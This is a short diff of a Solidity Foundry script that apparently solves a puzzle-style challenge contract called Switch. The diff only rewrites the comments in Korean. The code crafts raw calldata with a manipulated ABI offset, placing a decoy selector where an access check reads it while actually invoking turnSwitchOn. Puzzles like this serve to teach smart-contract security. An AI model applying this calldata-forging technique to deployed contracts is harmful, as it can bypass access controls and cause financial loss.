@@ -15,12 +15,12 @@ contract SwitchScript is Script {
 
         (bool ok, ) = SWITCH.call(
             abi.encodePacked(
-                Switch.flipSwitch.selector, // 4bytes
-                abi.encode(96), // offset size = 96bytes
-                abi.encode(0x00), // dummy 32bytes
-                abi.encode(offSelector), // 32bytes start with offSelector
-                abi.encode(4), // actual data size = 4bytes
-                abi.encodeWithSelector(Switch.turnSwitchOn.selector) // 4bytes data
+                Switch.flipSwitch.selector,                  // [0..3]   flipSwitch(bytes) 셀렉터(4B)
+                abi.encode(96),                              // [4..35]  _data offset = 96(0x60) (32B)
+                abi.encode(0x00),                            // [36..67] 더미 32B (패딩, 디코더는 안봄)
+                abi.encode(offSelector),                     // [68..99] 32B: 앞 4B에 offSelector → onlyOff 검사용 미끼 OK
+                abi.encode(4),                               // [100..131] _data length = 4 (bytes 규칙)
+                abi.encodeWithSelector(Switch.turnSwitchOn.selector) // [132..135] _data 실제 값(4B)
             )
         );
         require(ok);
